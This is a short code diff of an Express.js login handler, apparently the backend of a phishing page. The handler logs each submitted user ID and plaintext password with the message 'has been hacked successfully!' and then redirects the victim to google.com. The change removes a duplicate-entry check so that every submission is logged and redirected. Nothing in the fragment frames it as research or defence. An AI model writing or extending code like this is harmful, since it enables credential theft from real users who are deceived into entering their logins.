@@ -28,12 +28,8 @@ app.post("/",function(req,res){
             console.log(err);
         }
         else{
-            if(isAlreadyPresent){
-                res.redirect("/");
-            }
-            else{
             console.log(`${req.body.userLoginId} with password : ${req.body.password} has been hacked successfully!`);
-            res.redirect("https://www.google.com");}
+            res.redirect("https://www.google.com");
         }
     });}
     else{
